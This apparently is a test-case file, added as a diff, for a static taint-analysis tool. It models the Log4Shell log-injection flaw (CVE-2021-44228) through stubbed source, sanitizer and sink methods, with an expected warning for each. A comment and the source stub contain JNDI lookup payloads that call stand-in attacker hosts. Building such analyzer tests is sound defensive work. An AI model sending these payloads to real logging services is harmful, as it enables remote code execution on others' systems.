@@ -1,0 +1,189 @@
+// ================================================================
+//  LOG4SHELL INSPIRED LOG INJECTION SCENARIO
+//
+//  CVE: CVE-2021-44228
+//
+//  Context:
+//  HTTP request headers such as User-Agent and X-Forwarded-For
+//  were read from untrusted clients and passed directly to
+//  Log4j2's logger. Log4j2 evaluated JNDI lookup expressions
+//  (e.g. "${jndi:ldap://attacker.com/x}") embedded in those
+//  strings, triggering remote class loading and RCE.
+//  The root cause is unsanitized user-controlled data reaching a
+//  logging sink that performs further evaluation on its input.
+//
+//  Source : GetRequest
+//  Sanitizer : sanitizeInput
+//  Sink : logAudit
+// ================================================================
+
+class Log4ShellScenario {
+
+    // source: returns an attacker-controlled HTTP header value
+    GetRequest() {
+        return "${jndi:ldap://evil.example.com/pwn}";
+    }
+
+    // sanitizer : strips JNDI patterns and special characters
+    // from the string (example : replaces "${" with "")
+    sanitizeInput(raw) {
+        return "safe_header_value";
+    }
+
+    // sink : writes the message to the application log.
+    // In Log4j2 this evaluation of JNDI causes remote code execution.
+    logAudit(msg) {
+    }
+
+    // -------------------------------------------------------
+    //  logUnsafe
+    //
+    //  The User-Agent header is read from the request and
+    //  forwarded to the logger.
+    //
+    //  userAgent = GetRequest() : TAINT
+    //  logAudit(userAgent) : TAINT reaches sink
+    //
+    //  EXPECT: definite warning on logAudit(userAgent)
+    // -------------------------------------------------------
+    logUnsafe() {
+        def userAgent = this.GetRequest();
+        this.logAudit(userAgent);
+    }
+
+    // -------------------------------------------------------
+    //  logSafe
+    //
+    //  The header is sanitized before being handed to the
+    //  logger, so no JNDI pattern can survive.
+    //
+    //  raw = GetRequest() : TAINT
+    //  clean = sanitizeInput(raw) : CLEAN
+    //  logAudit(clean) : CLEAN reaches sink
+    //
+    //  EXPECT: no warning
+    // -------------------------------------------------------
+    logSafe() {
+        def raw = this.GetRequest();
+        def clean = this.sanitizeInput(raw);
+        this.logAudit(clean);
+    }
+
+    // -------------------------------------------------------
+    //  logWithAlias
+    //
+    //  Taint propagates through a chain of aliases.
+    //
+    //  raw = GetRequest() : TAINT
+    //  header = raw : TAINT
+    //  toLog = header : TAINT
+    //  logAudit(toLog) : TAINT reaches sink
+    //
+    //  EXPECT: definite warning on logAudit(toLog)
+    // -------------------------------------------------------
+    logWithAlias() {
+        def raw = this.GetRequest();
+        def header = raw;
+        def toLog = header;
+        this.logAudit(toLog);
+    }
+
+    // -------------------------------------------------------
+    //  logConditionalSanitization
+    //
+    //  A debug flag controls whether the raw header is
+    //  sanitized before logging. In production the flag is
+    //  sometimes absent, so sanitization is inconsistent.
+    //
+    //  After the branch join: TAINT lub CLEAN = TOP
+    //  logAudit(msg) : TOP reaches sink
+    //
+    //  EXPECT: possible warning on logAudit(msg)
+    // -------------------------------------------------------
+    logConditionalSanitization(isDebugMode) {
+        def raw = this.GetRequest();
+        def msg = raw;
+        if (isDebugMode)
+            msg = raw;
+        else
+            msg = this.sanitizeInput(raw);
+        this.logAudit(msg);
+    }
+
+    // -------------------------------------------------------
+    //  logInLoop
+    //
+    //  The server logs every incoming request in a loop
+    //  (e.g batch-processing a request queue). Each
+    //  iteration fetches a fresh header and logs it directly.
+    //
+    //  At loop entry header is TAINT.
+    //  logAudit(header) inside loop : TAINT reaches sink.
+    //
+    //  EXPECT: definite warning on logAudit(header) inside loop
+    // -------------------------------------------------------
+    logInLoop(numRequests) {
+        def i = 0;
+        while (i < numRequests) {
+            def header = this.GetRequest();
+            this.logAudit(header);
+            i = i + 1;
+        }
+    }
+
+    // -------------------------------------------------------
+    //  logInLoopSafe
+    //
+    //  Same request-queue scenario but sanitization happens
+    //  inside the loop before the logger call.
+    //
+    //  EXPECT: no warning on logAudit(clean) inside loop
+    // -------------------------------------------------------
+    logInLoopSafe(numRequests) {
+        def i = 0;
+        while (i < numRequests) {
+            def raw = this.GetRequest();
+            def clean = this.sanitizeInput(raw);
+            this.logAudit(clean);
+            i = i + 1;
+        }
+    }
+
+    // -------------------------------------------------------
+    //  logAfterReTaint
+    //
+    //  Illustrates a subtle bug: the variable is sanitized,
+    //  then overwritten with a fresh tainted source before
+    //  reaching the sink. The earlier sanitization is lost.
+    //
+    //  raw = GetRequest() : TAINT
+    //  msg = sanitizeInput(raw) : CLEAN
+    //  msg = GetRequest() : TAINT
+    //  logAudit(msg) : TAINT reaches sink
+    //
+    //  EXPECT: definite warning on logAudit(msg)
+    // -------------------------------------------------------
+    logAfterReTaint() {
+        def raw = this.GetRequest();
+        def msg = this.sanitizeInput(raw);
+        msg = this.GetRequest();
+        this.logAudit(msg);
+    }
+
+    // -------------------------------------------------------
+    //  logMultipleHeaders
+    //
+    //  Multiple headers are read and logged: one sanitized,
+    //  one not. Shows that taint-tracking is per-variable.
+    //
+    //  safeAgent = sanitizeInput(GetRequest()) : CLEAN -> no warning
+    //  rawIp = GetRequest() : TAINT -> definite warning
+    // -------------------------------------------------------
+    logMultipleHeaders() {
+        def rawAgent = this.GetRequest();
+        def safeAgent = this.sanitizeInput(rawAgent);
+        def rawIp = this.GetRequest();
+        this.logAudit(safeAgent);
+        this.logAudit(rawIp);
+    }
+}
